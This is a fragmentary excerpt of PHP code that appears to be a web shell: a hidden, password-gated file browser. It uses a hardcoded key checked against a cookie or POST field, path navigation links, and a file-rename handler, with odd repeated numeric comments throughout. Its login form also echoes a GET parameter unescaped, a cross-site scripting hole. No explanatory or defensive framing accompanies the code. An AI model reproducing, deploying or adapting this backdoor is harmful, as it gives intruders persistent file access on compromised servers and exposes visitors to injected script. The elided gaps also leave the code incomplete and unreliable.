...
$auth_key = "5295eeaf33b23bc69ec1f3fbd8430032";
...
$pass = false;
if (isset($_COOKIE['pw_name_48959'])) {
    if(($_COOKIE['pw_name_48959']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_48959'])) {
        if(($_POST['pw_name_48959']) == $auth_key) {
            setcookie("pw_name_48959", $_POST['pw_name_48959']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_48959' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725502273521609 1725502273232945 1725502273687308 1725502273208853
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725502273521609 1725502273232945 1725502273687308 1725502273208853
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725502273521609 1725502273232945 1725502273687308 1725502273208853
            $name = PATH . "/" . $_GET['r'];
